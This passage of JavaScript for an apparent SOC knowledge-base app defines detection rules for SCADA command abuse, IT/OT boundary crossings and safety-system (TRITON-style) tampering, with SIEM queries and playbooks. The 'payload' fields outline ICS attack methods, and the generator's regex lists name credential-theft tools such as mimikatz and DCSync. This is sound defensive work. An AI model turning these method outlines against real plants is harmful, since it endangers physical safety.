    references:['MITRE ATT&CK for ICS T0839','IEC 62443','NIST SP 800-82','CISA ICS-CERT Advisories']
},
{
    id:'ICS-002',name:'Unauthorized SCADA/HMI Command',category:'ICS - Impair Process Control',
    mitre:{tactic:'TA0105',technique:'T0855',name:'Unauthorized Command Message'},severity:'Critical',framework:'ICS',
    dataSources:['OT Network Monitor','SCADA Logs','HMI Audit Logs','Historian'],
    description:'Detects unauthorized command messages sent to SCADA systems or HMIs that could manipulate industrial processes, open/close valves, change setpoints, or override safety systems.',
    queries:{
        splunk:`index=ot_network sourcetype=scada_commands
| where match(command_type,"(?i)(set_point|valve_open|valve_close|breaker_trip|override|emergency_stop)")
| where NOT src_ip IN (authorized_hmi_workstations)
| where NOT user IN (authorized_operators)
| stats count by src_ip, dest_ip, command_type, target_device, user`,
        sentinel:`CommonSecurityLog | where DeviceVendor=="SCADA_Monitor" | where Activity matches regex @"(?i)(setpoint|valve|breaker|override|emergency)" | where SourceIP !in (authorized_hmi_ips)`,
        qradar:`SELECT sourceip, destinationip, UTF8(payload) as SCADACommand FROM events WHERE LOGSOURCETYPENAME(logsourceid) LIKE '%SCADA%' AND (UTF8(payload) ILIKE '%setpoint%' OR UTF8(payload) ILIKE '%valve%' OR UTF8(payload) ILIKE '%override%') AND sourceip NOT IN (authorized_hmi_list) LAST 1 HOURS`,
        elastic:`event.category:"scada" and event.action:("setpoint" or "valve" or "breaker" or "override") and not source.ip:(authorized_hmi_list)`,
        wazuh:`<rule id="200010" level="15"><if_sid>87010</if_sid><field name="scada_command">setpoint|valve|breaker|override</field><description>CRITICAL ICS: Unauthorized SCADA command</description><mitre><id>T0855</id></mitre></rule>`,
        crowdstrike:`N/A - Use dedicated OT monitoring (Claroty, Nozomi, Dragos)`,
        cortex_xdr:`dataset=xdr_data | filter event_type=OT_COMMAND AND action_ot_command_type IN ("setpoint","valve","breaker","override") AND src_ip NOT IN (authorized_list)`,
        sentinelone:`N/A - Use dedicated OT monitoring for SCADA communications`
    },
    tpAnalysis:{
        truePositive:['SCADA commands from unauthorized workstation','Setpoint changes outside operational range','Safety override commands without emergency condition','Commands during off-hours without operator present','Rapid multiple commands to different devices (automated attack)'],
        falsePositive:['Authorized operator commands during normal operations','Emergency response actions by authorized personnel','Scheduled process changes with change ticket','Testing during planned outage'],
        tpIndicators:'Unauthorized source, setpoint outside normal range, safety override without emergency, off-hours, multiple devices targeted rapidly',
        fpIndicators:'From authorized HMI, authorized operator account, within normal operational range, change ticket exists',
        investigationSteps:'1. Verify command authorization with operations\n2. Check if command was within safe operating parameters\n3. Verify process state after command\n4. Check for IT/OT boundary compromise\n5. Review operator authentication logs\n6. Contact plant operations immediately'
    },
    soarAutomation:{
        autoActions:['Alert OT-SOC and plant operations immediately','Verify command against safe operating limits','Check operator authentication','Log complete command session','Compare process state to normal baseline'],
        conditionalActions:['IF safety override → EMERGENCY: manual process verification required','IF setpoint outside safe range → Alert plant engineering','IF from IT network → IT/OT breach investigation','IF multiple devices → Possible coordinated attack'],
        playbookFlow:'1. Detect unauthorized command → 2. Alert operations → 3. Verify process safety → 4. Block source → 5. Investigate → 6. Restore if tampered'
    },
    playbook:{
        detection:'OT network monitoring detects SCADA protocol commands from unauthorized sources.',
        containment:'1. Alert plant operations IMMEDIATELY\n2. Verify process is within safe parameters\n3. Block unauthorized source at OT firewall\n4. Prepare for manual process control\n5. Preserve evidence',
        eradication:'1. Identify and remove unauthorized access\n2. Verify all SCADA commands were legitimate\n3. Check for persistent backdoor access\n4. Strengthen OT access controls',
        recovery:'1. Verify all process parameters are within safe range\n2. Restore any tampered setpoints\n3. Update OT firewall rules\n4. Implement additional access controls\n5. Conduct OT security assessment'
    },
    policy:'SCADA Security: Restrict SCADA commands to authorized HMIs only. Implement operator authentication. Log all SCADA commands. Deploy OT network monitoring. Implement safety system separation.',
    payload:`# SCADA attack methods:
# Modbus: Write register to change setpoint
# DNP3: Direct operate command to open/close
# IEC 104: Setpoint command
# OPC UA: Write to process variable
# Industroyer: Automated breaker operations via IEC 104/61850`,
    useCases:['Detect unauthorized SCADA commands','Monitor setpoint changes','Alert on safety system overrides','Identify IT-to-OT command injection','Detect Industroyer-style attacks','Monitor HMI unauthorized access'],
    references:['MITRE ATT&CK for ICS T0855','IEC 62443-3-3','NIST SP 800-82 Rev 3']
},
{
    id:'ICS-003',name:'IT/OT Network Boundary Violation',category:'ICS - Lateral Movement',
    mitre:{tactic:'TA0109',technique:'T0886',name:'Remote Services'},severity:'High',framework:'ICS',
    dataSources:['Firewall Logs','OT Network Monitor','IDS','Network Flow Data'],
    description:'Detects unauthorized traffic crossing the IT/OT network boundary, indicating potential lateral movement from IT network into OT/ICS environment.',
    queries:{
        splunk:`index=firewall (src_zone="IT" AND dest_zone="OT") OR (src_subnet="10.0.0.0/8" AND dest_subnet="172.16.0.0/12")
| where NOT match(rule_name,"(?i)(allowed_it_ot|jumpserver|historian)")
| stats count by src_ip, dest_ip, dest_port, app, action
| where action="allowed" OR count >= 5`,
        sentinel:`AzureNetworkAnalytics_CL | where SrcSubnet_s IN ("IT_Subnet") AND DestSubnet_s IN ("OT_Subnet") | where RuleName_s !has "Allowed_IT_OT"`,
        qradar:`SELECT sourceip, destinationip, destinationport, COUNT(*) as Connections FROM events WHERE sourceip INCIDR '10.0.0.0/8' AND destinationip INCIDR '172.16.0.0/12' GROUP BY sourceip, destinationip, destinationport LAST 1 HOURS`,
        elastic:`source.ip:10.0.0.0/8 and destination.ip:172.16.0.0/12 and event.action:"allowed"`,
        wazuh:`<rule id="200020" level="12"><if_sid>2502</if_sid><srcip>10.0.0.0/8</srcip><dstip>172.16.0.0/12</dstip><description>IT/OT boundary violation detected</description><mitre><id>T0886</id></mitre></rule>`,
        crowdstrike:`Event_SimpleName=NetworkConnectIP4 | where LocalAddressIP4 CIDR "10.0.0.0/8" AND RemoteAddressIP4 CIDR "172.16.0.0/12"`,
        cortex_xdr:`dataset=xdr_data | filter event_type=NETWORK AND src_ip INCIDR "10.0.0.0/8" AND dst_ip INCIDR "172.16.0.0/12"`,
        sentinelone:`EventType="Network" AND SrcIP INCIDR "10.0.0.0/8" AND DstIP INCIDR "172.16.0.0/12"`
    },
    tpAnalysis:{
        truePositive:['Direct connection from IT workstation to PLC/RTU','SSH/RDP from IT to OT engineering workstation bypassing jump server','Unusual protocol traffic crossing IT/OT boundary','IT malware scanning OT network','Data exfiltration from OT to external via IT'],
        falsePositive:['Authorized data historian replication','IT monitoring tools checking OT device health','Authorized jump server connections','Patch management traffic during approved window'],
        tpIndicators:'Direct IT→OT connection bypassing DMZ, industrial protocol from IT source, scanning activity targeting OT, off-hours access',
        fpIndicators:'Through authorized jump server, historian replication, approved monitoring tool, during maintenance window with change ticket',
        investigationSteps:'1. Verify if connection is through approved architecture\n2. Check source for compromise indicators\n3. Verify destination device type (PLC, HMI, engineering workstation)\n4. Check if OT protocols are being used from IT source\n5. Alert OT security team'
    },
    soarAutomation:{
        autoActions:['Alert both IT-SOC and OT-SOC','Identify source and destination devices','Check IT/OT architecture for authorized paths','Block unauthorized connection at OT firewall'],
        conditionalActions:['IF direct IT→PLC connection → CRITICAL: possible ICS attack','IF scanning activity → Isolate IT source + OT vulnerability assessment','IF industrial protocol from IT → Block + investigate immediately'],
        playbookFlow:'1. Detect boundary violation → 2. Verify path authorization → 3. If unauthorized: block + alert OT-SOC → 4. Investigate IT source → 5. OT impact assessment'
    },
    playbook:{
        detection:'Firewall and OT network monitoring detect unauthorized traffic crossing the IT/OT boundary.',
        containment:'1. Block the unauthorized connection at OT firewall\n2. Isolate the IT source system\n3. Alert OT operations team\n4. Verify OT environment integrity\n5. Check for lateral movement within OT',
        eradication:'1. Remove any malware/tools on IT source\n2. Verify no OT devices were compromised\n3. Check IT/OT firewall rules\n4. Strengthen network segmentation',
        recovery:'1. Review and harden IT/OT architecture\n2. Implement proper DMZ with data diodes if needed\n3. Update firewall rules\n4. Conduct IT/OT security assessment\n5. Follow IEC 62443 zone and conduit model'
    },
    policy:'IT/OT Segmentation: Implement Purdue Model architecture. Use DMZ for IT/OT data exchange. Deploy data diodes for critical links. All IT→OT access through jump servers only. Monitor all boundary traffic.',
    payload:`# IT/OT lateral movement methods:
# RDP/SSH to OT engineering workstation
# Exploiting shared credentials between IT and OT
# VPN pivoting into OT network
# Compromising IT/OT data historian
# Exploiting remote access solutions (TeamViewer, VNC) in OT
# USB-based malware transfer (Stuxnet method)`,
    useCases:['Detect IT/OT boundary violations','Monitor unauthorized OT access','Alert on industrial protocol from IT','Identify OT reconnaissance from IT','Detect Stuxnet-style lateral movement','Monitor jump server bypass'],
    references:['MITRE ATT&CK for ICS T0886','IEC 62443','Purdue Enterprise Reference Architecture','NIST SP 800-82']
},
{
    id:'ICS-004',name:'Safety Instrumented System (SIS) Tampering',category:'ICS - Inhibit Response',
    mitre:{tactic:'TA0106',technique:'T0880',name:'Loss of Safety'},severity:'Critical',framework:'ICS',
    dataSources:['Safety System Logs','OT Network Monitor','SIS Controller Logs'],
    description:'Detects attempts to tamper with Safety Instrumented Systems (SIS) like Triconex, Honeywell FSC, or ABB safety controllers. SIS tampering can lead to catastrophic physical consequences.',
    queries:{
        splunk:`index=ot_network (sourcetype=triconex OR sourcetype=safety_system)
| where match(command,"(?i)(program|download|key_switch|disable|bypass|override|force)")
| stats count by src_ip, dest_ip, command, safety_controller_name`,
        sentinel:`CommonSecurityLog | where DeviceVendor IN ("Triconex","Honeywell_FSC","ABB_Safety") | where Activity matches regex @"(?i)(program|download|disable|bypass|override|force)"`,
        qradar:`SELECT sourceip, destinationip, UTF8(payload) FROM events WHERE LOGSOURCETYPENAME(logsourceid) LIKE '%Safety%' AND (UTF8(payload) ILIKE '%program%' OR UTF8(payload) ILIKE '%bypass%' OR UTF8(payload) ILIKE '%disable%' OR UTF8(payload) ILIKE '%force%') LAST 24 HOURS`,
        elastic:`event.category:"safety_system" and event.action:("program" or "disable" or "bypass" or "override" or "force")`,
        wazuh:`<rule id="200030" level="15"><if_sid>87030</if_sid><field name="safety_command">program|disable|bypass|override|force</field><description>CRITICAL ICS: Safety system tampering detected</description><mitre><id>T0880</id></mitre></rule>`,
        crowdstrike:`N/A - Requires dedicated OT safety system monitoring`,
        cortex_xdr:`dataset=xdr_data | filter event_type=OT_SAFETY AND action_safety_command IN ("program","disable","bypass","override","force")`,
        sentinelone:`N/A - Requires dedicated OT safety system monitoring`
    },
    tpAnalysis:{
        truePositive:['Safety controller programming from unauthorized source','Safety bypass without approved maintenance order','SIS key switch change detected without physical verification','TRITON/TRISIS malware indicators','Safety logic modification that weakens interlock','Multiple safety systems targeted simultaneously'],
        falsePositive:['Authorized SIS maintenance during planned shutdown','Safety system testing with approved test plan','Commissioning new safety instrumented function','Periodic proof testing of safety functions'],
        tpIndicators:'Unauthorized source, no maintenance order, multiple SIS targeted, logic weakens safety function, TRITON indicators, off-hours',
        fpIndicators:'Approved maintenance window, authorized safety engineer, change management approval, proof test schedule',
        investigationSteps:'1. IMMEDIATELY verify with plant operations\n2. Check safety system integrity\n3. Verify key switch physical state\n4. Compare safety logic to baseline\n5. Check for TRITON/TRISIS indicators\n6. Activate ICS incident response plan'
    },
    soarAutomation:{
        autoActions:['EMERGENCY ALERT to plant operations, OT-SOC, and management','Verify safety system state via independent channel','Log all safety system communications','Activate ICS emergency response plan'],
        conditionalActions:['IF safety bypass detected → Prepare for manual shutdown if needed','IF TRITON indicators → National CERT notification + full ICS IR','IF multiple SIS targeted → Assume coordinated attack on safety'],
        playbookFlow:'1. Detect SIS tampering → 2. EMERGENCY alert → 3. Verify safety state → 4. Secure plant → 5. Full ICS investigation → 6. National CERT notification if warranted'
    },
    playbook:{
        detection:'OT safety system monitoring detects unauthorized access to SIS controllers. This is the highest priority ICS alert.',
        containment:'1. IMMEDIATELY alert plant operations\n2. Verify safety systems are functional\n3. Prepare for manual safety actions\n4. Isolate SIS network from IT/OT\n5. Consider controlled plant shutdown if safety is compromised',
        eradication:'1. Restore SIS to known-good state from trusted backup\n2. Verify all safety interlocks\n3. Full forensics on SIS engineering workstation\n4. Check for TRITON/TRISIS malware\n5. Identify attack vector',
        recovery:'1. Restore SIS from validated backup\n2. Full safety system proof test\n3. Network architecture review\n4. Implement safety system isolation\n5. Engage safety system vendor\n6. Regulatory notification if required'
    },
    policy:'SIS Security: Air-gap safety systems from business/IT networks. Implement physical key switch controls. Maintain validated SIS logic backups. Restrict SIS programming to dedicated, secured engineering workstations. Follow IEC 61511.',
    payload:`# SIS Attack Examples:
# TRITON/TRISIS (2017): Targeted Triconex safety controllers at Saudi petrochemical plant
# Modified safety logic to prevent emergency shutdown during dangerous conditions
# Goal: Cause physical damage while preventing safety system from stopping the process
# Attack chain: IT compromise → OT lateral movement → Engineering workstation → SIS controller`,
    useCases:['Detect unauthorized SIS programming','Monitor safety bypass commands','Alert on TRITON/TRISIS indicators','Identify safety interlock weakening','Detect physical key switch manipulation','Monitor SIS network boundary violations'],
    references:['MITRE ATT&CK for ICS T0880','IEC 61511','CISA TRITON Advisory','Dragos TRISIS Analysis']
}
];


// ═══════════════════════════════════════════════════════════════════════════
// SMART RULE GENERATOR ENGINE
// Type ANY rule name/concept → generates full rule package
// ═══════════════════════════════════════════════════════════════════════════

const ruleTemplates = {
    platforms: ['splunk','sentinel','qradar','elastic','wazuh','crowdstrike','cortex_xdr','sentinelone'],
    severities: ['Critical','High','Medium','Low'],
    generateRule: function(searchTerm) {
        const term = searchTerm.trim();
        if (!term) return null;

        // Try to match MITRE technique
        const mitreMatch = this.matchMitre(term);
        // Try to match category
        const catMatch = this.matchCategory(term);

        const generated = {
            id: 'GEN-' + Math.random().toString(36).substr(2,5).toUpperCase(),
            name: this.formatRuleName(term),
            category: catMatch || 'Custom Detection',
            mitre: mitreMatch || { tactic: 'Custom', technique: 'Custom', name: term },
            severity: this.guessSeverity(term),
            framework: term.toLowerCase().match(/ics|scada|plc|ot|hmi|rtu|dcs|modbus|dnp3|safety/) ? 'ICS' : 'Enterprise',
            dataSources: this.guessDataSources(term),
            description: 'Custom detection rule for: ' + term + '. This rule monitors for indicators associated with ' + term + ' activity. Configure thresholds based on your environment baseline.',
            queries: this.generateQueries(term),
            tpAnalysis: {
                truePositive: [
                    'Activity matches known ' + term + ' attack patterns',
                    'Followed by additional post-exploitation activity',
                    'Source is not in authorized/known-good list',
                    'Occurs outside normal business hours or patterns',
                    'Correlates with other alerts in kill chain'
                ],
                falsePositive: [
                    'Authorized security testing or red team exercise',
                    'Legitimate admin activity matching the pattern',
                    'Automated tools with similar behavior patterns',
                    'Known software with overlapping signatures'
                ],
                tpIndicators: 'Correlate with threat intel, check source reputation, verify timing, look for post-activity indicators, check authorization',
                fpIndicators: 'Authorized source, during maintenance window, matches known admin pattern, no post-activity indicators',
                investigationSteps: '1. Verify if activity is authorized\n2. Check source against threat intel\n3. Review full process/activity chain\n4. Look for lateral movement or persistence\n5. Assess scope and impact\n6. Escalate if confirmed malicious'
            },
            soarAutomation: {
                autoActions: [
                    'Enrich source IP/user with threat intelligence',
                    'Check against known-good baselines',
                    'Create investigation ticket',
                    'Alert appropriate SOC tier based on severity'
                ],
                conditionalActions: [
                    'IF confirmed malicious → Isolate + contain + escalate',
                    'IF authorized activity → Document and close',
                    'IF uncertain → Escalate to Tier 2 for review',
                    'IF part of larger campaign → Trigger full IR'
                ],
                playbookFlow: '1. Detect → 2. Enrich → 3. Assess → 4. Contain if malicious → 5. Investigate → 6. Remediate → 7. Report'
            },
            playbook: {
                detection: 'Monitor for indicators matching ' + term + ' activity patterns. Correlate with other data sources and threat intelligence.',
                containment: '1. Isolate affected systems\n2. Block malicious indicators (IPs, domains, hashes)\n3. Disable compromised accounts\n4. Preserve evidence for forensics\n5. Notify stakeholders',
                eradication: '1. Remove malicious artifacts\n2. Patch exploited vulnerabilities\n3. Close attack vector\n4. Hunt for persistence mechanisms\n5. Verify no further compromise',
                recovery: '1. Restore affected systems\n2. Verify system integrity\n3. Reset compromised credentials\n4. Monitor for recurrence\n5. Update detection rules based on findings'
            },
            policy: 'Implement detection and prevention controls for ' + term + '. Follow organizational security policies. Ensure logging is enabled for relevant data sources. Conduct regular security assessments.',
            payload: '# ' + term + ' - Attack Pattern Examples\n# Configure detection based on your specific environment\n# Consult MITRE ATT&CK for detailed technique information\n# Tune thresholds based on baseline analysis',
            useCases: [
                'Detect ' + term + ' activity in enterprise environment',
                'Monitor for ' + term + ' indicators across all endpoints',
                'Alert on anomalous behavior matching ' + term + ' patterns',
                'Correlate ' + term + ' with threat intelligence feeds',
                'Track ' + term + ' attempts for trending and reporting'
            ],
            references: ['MITRE ATT&CK Framework', 'NIST Cybersecurity Framework', 'CIS Controls'],
            isGenerated: true
        };
        return generated;
    },

    formatRuleName: function(term) {
        return term.split(/[\s_-]+/).map(w => w.charAt(0).toUpperCase() + w.slice(1).toLowerCase()).join(' ') + ' Detection';
    },

    matchCategory: function(term) {
        const t = term.toLowerCase();
        const map = {
            'phishing|spam|email|spearphish': 'Initial Access',
            'brute|spray|credential stuff|login|auth': 'Initial Access',
            'exploit|cve|vuln|rce|sqli|xss|ssrf': 'Initial Access',
            'powershell|wmi|script|cmd|exec|macro|shell': 'Execution',
            'persist|registry|run key|startup|schedule|task|service|boot': 'Persistence',
            'privilege|escalat|token|imperson|uac|sudo|suid': 'Privilege Escalation',
            'evas|bypass|tamper|disable|obfuscat|encode|pack|inject|hollow': 'Defense Evasion',
            'credential|dump|lsass|mimikatz|kerbero|hash|ntlm|password|sam|ntds|dcsync': 'Credential Access',
            'discover|enum|recon|scan|bloodhound|ldap|portscan|nmap': 'Discovery',
            'lateral|psexec|rdp|smb|wmi|winrm|ssh|pass.the': 'Lateral Movement',
            'collect|stage|archive|compress|screen|keylog|clipboard': 'Collection',
            'exfil|tunnel|dns|upload|transfer|steal|leak': 'Exfiltration',
            'c2|beacon|callback|cobalt|command.and.control|implant|rat|backdoor': 'Command and Control',
            'ransom|encrypt|wipe|destroy|defac|ddos|impact|sabotag': 'Impact',
            'plc|scada|hmi|ics|ot|modbus|dnp3|rtu|dcs|safety|saf.*system': 'ICS - Impair Process Control'
        };
        for (const [pattern, cat] of Object.entries(map)) {
            if (new RegExp(pattern, 'i').test(t)) return cat;
        }
        return null;
    },

    matchMitre: function(term) {
        const t = term.toLowerCase();
        // Check if term is a MITRE technique ID
        const techMatch = term.match(/^T\d{4}(\.\d{3})?$/i);
        if (techMatch) return { tactic: 'Lookup', technique: term.toUpperCase(), name: term.toUpperCase() };

        const techniques = {
            'phishing': { tactic:'TA0001',technique:'T1566',name:'Phishing' },
            'brute force': { tactic:'TA0001',technique:'T1110',name:'Brute Force' },
            'powershell': { tactic:'TA0002',technique:'T1059.001',name:'PowerShell' },
            'wmi': { tactic:'TA0002',technique:'T1047',name:'WMI' },
            'scheduled task': { tactic:'TA0003',technique:'T1053.005',name:'Scheduled Task' },
            'registry': { tactic:'TA0003',technique:'T1547.001',name:'Registry Run Keys' },
            'token': { tactic:'TA0004',technique:'T1134',name:'Access Token Manipulation' },
            'mimikatz': { tactic:'TA0006',technique:'T1003.001',name:'LSASS Memory' },
            'lsass': { tactic:'TA0006',technique:'T1003.001',name:'LSASS Memory' },
            'kerberoast': { tactic:'TA0006',technique:'T1558.003',name:'Kerberoasting' },
            'dcsync': { tactic:'TA0006',technique:'T1003.006',name:'DCSync' },
            'psexec': { tactic:'TA0008',technique:'T1021.002',name:'SMB/Admin Shares' },
            'rdp': { tactic:'TA0008',technique:'T1021.001',name:'Remote Desktop Protocol' },
            'dns tunnel': { tactic:'TA0010',technique:'T1048.003',name:'DNS Exfiltration' },
            'cobalt strike': { tactic:'TA0011',technique:'T1071.001',name:'Web Protocols C2' },
            'ransomware': { tactic:'TA0040',technique:'T1486',name:'Data Encrypted for Impact' },
            'bloodhound': { tactic:'TA0007',technique:'T1087.002',name:'Domain Account Discovery' }
        };
        for (const [key, val] of Object.entries(techniques)) {
            if (t.includes(key)) return val;
        }
        return null;
    },

    guessSeverity: function(term) {
        const t = term.toLowerCase();
        if (/ransom|lsass|dcsync|golden|cobalt|triton|safety|sis|plc.*tamper|domain.*admin|krbtgt/.test(t)) return 'Critical';
        if (/brute|phish|lateral|mimikatz|kerbero|beacon|exfil|privilege|persist|credential/.test(t)) return 'High';
        if (/scan|recon|discover|enum|staging|collection/.test(t)) return 'Medium';
        return 'Medium';
    },

    guessDataSources: function(term) {
        const t = term.toLowerCase();
        const sources = [];
        if (/email|phish/.test(t)) sources.push('Email Gateway','Exchange/O365 Logs');
        if (/endpoint|process|powershell|cmd|exec|lolbin|persist/.test(t)) sources.push('Sysmon','EDR Telemetry','Windows Security Logs');
        if (/network|dns|c2|beacon|tunnel|exfil|scan/.test(t)) sources.push('Network Logs','Firewall Logs','Proxy Logs','DNS Logs');
        if (/credential|lsass|kerbero|auth|login|brute|dcsync/.test(t)) sources.push('Windows Security Logs','Domain Controller Logs');
        if (/web|exploit|sqli|xss|waf/.test(t)) sources.push('WAF Logs','Web Server Logs','IDS/IPS');
        if (/ics|scada|plc|ot|hmi|modbus|safety/.test(t)) sources.push('OT Network Monitor','SCADA Logs','Safety System Logs');
        if (/cloud|azure|aws|gcp/.test(t)) sources.push('Cloud Audit Logs','Cloud Trail','Activity Logs');
        if (/registry|file|disk/.test(t)) sources.push('Sysmon','File Integrity Monitoring');
        if (sources.length === 0) sources.push('Sysmon','EDR Telemetry','Windows Security Logs','Network Logs');
        return sources;
    },

    generateQueries: function(term) {
        const t = term.toLowerCase().replace(/[^a-z0-9\s]/g,'');
        const keywords = t.split(/\s+/).filter(w => w.length > 2).join('|');
        return {
            splunk: `index=* (${keywords})\n| stats count by src_ip, dest_ip, user, _time\n| where count >= 1\n| eval AlertName="${term} Detection"\n\n` +
                `\` Customize: Replace index=* with specific index\n\` Adjust thresholds based on environment baseline\n\` Add field extractions for your data sources`,
            sentinel: `// ${term} Detection\nlet lookback = 24h;\nSecurityEvent\n| where TimeGenerated > ago(lookback)\n| where EventData matches regex @"(?i)(${keywords})"\n| summarize count() by Computer, Account, bin(TimeGenerated, 1h)\n| where count_ >= 1\n\n// Customize: Add specific EventIDs and fields for your environment`,
            qradar: `-- ${term} Detection\nSELECT sourceip, destinationip, username,\n  COUNT(*) as EventCount\nFROM events\nWHERE (UTF8(payload) ILIKE '%${t.split(' ')[0]}%')\nGROUP BY sourceip, destinationip, username\nHAVING EventCount >= 1\nLAST 24 HOURS\n\n-- Customize: Add specific QID names and log source types`,
            elastic: `// ${term} Detection\nevent.category: * and message: /(${keywords})/\n\n// Customize: Add specific event.code, process.name, or other fields\n// Set threshold rules in Kibana Detection Engine`,
            wazuh: `<!-- ${term} Detection -->\n<rule id="199999" level="10">\n  <description>${term} activity detected</description>\n  <mitre><id>Custom</id></mitre>\n</rule>\n\n<!-- Customize: Add specific decoder fields and match patterns -->`,
            crowdstrike: `// ${term} Detection - Falcon LogScale\nEvent_SimpleName=*\n| where CommandLine MATCHES "(?i).*(${keywords}).*"\n  OR FileName MATCHES "(?i).*(${keywords}).*"\n| stats count by aid, ComputerName, UserName`,
            cortex_xdr: `// ${term} Detection - Cortex XDR XQL\ndataset=xdr_data\n| filter event_type=* AND (\n    action_process_command_line ~= "${t.split(' ')[0]}"\n    OR action_file_name ~= "${t.split(' ')[0]}"\n  )\n| comp count() by agent_hostname, action_username`,
            sentinelone: `// ${term} Detection - SentinelOne Deep Visibility\nEventType = "*"\nAND (CmdLine CONTAINS "${t.split(' ')[0]}" OR SrcProcName CONTAINS "${t.split(' ')[0]}")\n| Group by EndpointName, User`
        };
    }
};


// ═══════════════════════════════════════════════════════════════════════════
// SEARCH ENGINE - Searches database + generates if not found
// ═══════════════════════════════════════════════════════════════════════════

function searchRules(query) {
    if (!query || query.trim().length === 0) return ruleDatabase;
    const terms = query.toLowerCase().split(/\s+/);
    const results = ruleDatabase.filter(rule => {
        const searchText = [
            rule.id, rule.name, rule.category, rule.description,
            rule.mitre.technique, rule.mitre.name, rule.severity,
            rule.framework || '',
            ...rule.dataSources, ...rule.useCases,
            ...Object.keys(rule.queries),
            ...(rule.tpAnalysis ? rule.tpAnalysis.truePositive : []),
            ...(rule.tpAnalysis ? rule.tpAnalysis.falsePositive : [])
        ].join(' ').toLowerCase();
        return terms.every(term => searchText.includes(term));
    }).sort((a, b) => {
        const q = query.toLowerCase();
        const aName = a.name.toLowerCase().includes(q) ? 0 : 1;
        const bName = b.name.toLowerCase().includes(q) ? 0 : 1;
        return aName - bName;
    });
    return results;
}


// ═══════════════════════════════════════════════════════════════════════════
// UI RENDERING
// ═══════════════════════════════════════════════════════════════════════════

function renderKnowledgeBase(query = '') {
    const results = searchRules(query);
    const dashboard = document.getElementById('dashboard');
    const content = document.getElementById('page-content');
    dashboard.classList.add('hidden');
    content.classList.remove('hidden');

    const grouped = {};
    results.forEach(rule => {
        if (!grouped[rule.category]) grouped[rule.category] = [];
        grouped[rule.category].push(rule);
    });

    const sevClass = s => s==='Critical'?'kb-sev-critical':s==='High'?'kb-sev-high':s==='Medium'?'kb-sev-medium':'kb-sev-low';

    // Check if we should offer to generate
    const showGenerator = query.length >= 3 && results.length < 3;

    let html = `
        <div class="kb-header">
            <h1>SOC KNOWLEDGE BASE</h1>
            <p class="subtitle">MITRE ATT&CK Enterprise + ICS | ${ruleDatabase.length} Rules | Smart Rule Generator</p>
            <p class="subtitle" style="color:var(--accent);font-size:10px;margin-top:4px">Type ANY rule name → get full query, playbook, TP/FP analysis, SOAR automation & SOC guidance</p>
        </div>
        <div class="kb-search-container">
            <div class="kb-search-box">
                <span class="kb-search-icon">⌕</span>
                <input type="text" id="kb-search-input" class="kb-search-input"
                    placeholder="Search rules... (e.g., phishing, kerberoasting, ransomware, T1566, LSASS, PLC tampering, SCADA)"
                    value="${escapeHtml(query)}"
                    onkeyup="debounceSearch(this.value)"
                    autofocus>
                <span class="kb-result-count">${results.length} rules</span>
            </div>
            <div class="kb-filter-bar">
                <button class="kb-filter-btn ${!query?'kb-filter-active':''}" onclick="filterKB('')">ALL (${ruleDatabase.length})</button>
                <button class="kb-filter-btn" onclick="filterKB('Enterprise')" style="border-color:#00d4ff;color:#00d4ff">IT/ENTERPRISE</button>
                <button class="kb-filter-btn" onclick="filterKB('ICS')" style="border-color:#ff6b35;color:#ff6b35">ICS/OT</button>
                <span style="color:var(--text-dim);font-size:9px;padding:3px">|</span>
                ${Object.keys(categoryMeta).filter(c=>!c.startsWith('ICS')).map(cat =>
                    `<button class="kb-filter-btn" onclick="filterKB('${cat}')">${cat.split(' ').map(w=>w[0]).join('').toUpperCase()}</button>`
                ).join('')}
            </div>
        </div>`;

    // Show generator prompt if few results
    if (showGenerator) {
        html += `
        <div class="kb-generator-prompt" style="background:var(--bg-card);border:1px solid var(--accent);border-radius:4px;padding:16px;margin-bottom:16px">
            <div style="color:var(--accent);font-size:13px;font-weight:700;margin-bottom:8px">⚛ SMART RULE GENERATOR</div>
            <div style="color:var(--text-secondary);font-size:12px;margin-bottom:12px">Can't find what you're looking for? Generate a complete detection rule for "<strong style="color:var(--accent)">${escapeHtml(query)}</strong>" with full queries, TP/FP analysis, SOAR automation, and playbook.</div>
            <button class="btn-hack" onclick="generateAndShowRule('${escapeHtml(query)}')" style="border-color:var(--accent)">⚡ GENERATE RULE FOR "${escapeHtml(query).toUpperCase()}"</button>
        </div>`;
    }

    html += '<div class="kb-results">';

    if (results.length === 0) {
        html += `<div class="kb-empty">
            <div class="kb-empty-icon">⊘</div>
            <div>No exact matches for "${escapeHtml(query)}"</div>
            <div class="kb-empty-hint" style="margin-top:12px">
                <button class="btn-hack" onclick="generateAndShowRule('${escapeHtml(query)}')" style="border-color:var(--accent);font-size:12px;padding:8px 20px">⚡ AUTO-GENERATE RULE FOR "${escapeHtml(query).toUpperCase()}"</button>
            </div>
            <div class="kb-empty-hint" style="margin-top:8px">Or try: phishing, brute force, powershell, mimikatz, kerberoasting, ransomware, cobalt strike, PLC tampering, SCADA</div>
        </div>`;
    } else {
        Object.keys(grouped).forEach(category => {
            const meta = categoryMeta[category] || { icon: '◈', color: 'var(--accent)' };
            const fw = (meta.framework === 'ICS') ? '<span style="color:#ff6b35;font-size:9px;margin-left:8px;border:1px solid #ff6b35;padding:0 4px;border-radius:2px">ICS</span>' : '';
            html += `
                <div class="kb-category">
                    <div class="kb-category-header" style="border-left-color:${meta.color}">
                        <span class="kb-cat-icon" style="color:${meta.color}">${meta.icon}</span>
                        <span class="kb-cat-name">${category.toUpperCase()}</span>${fw}
                        <span class="kb-cat-count">${grouped[category].length} rules</span>
                    </div>
                    <div class="kb-rule-list">`;
            grouped[category].forEach(rule => {
                const fwBadge = (rule.framework === 'ICS') ? '<span style="color:#ff6b35;font-size:8px;border:1px solid #ff6b35;padding:0 4px;border-radius:2px;margin-left:4px">ICS</span>' : '';
                html += `
                    <div class="kb-rule-card" onclick="showRuleDetail('${rule.id}')">
                        <div class="kb-rule-top">
                            <span class="kb-rule-id">${rule.id}${fwBadge}</span>
                            <span class="kb-rule-sev ${sevClass(rule.severity)}">${rule.severity.toUpperCase()}</span>
                        </div>
                        <div class="kb-rule-name">${rule.name}</div>
                        <div class="kb-rule-meta">
                            <span class="kb-rule-mitre">${rule.mitre.technique}</span>
                            <span class="kb-rule-mitre-name">${rule.mitre.name}</span>
                        </div>
                        <div class="kb-rule-desc">${rule.description.substring(0,120)}...</div>
                        <div class="kb-rule-platforms">
                            ${Object.keys(rule.queries).map(p => `<span class="kb-platform-tag">${p}</span>`).join('')}
                        </div>
                    </div>`;
            });
            html += '</div></div>';
        });
    }

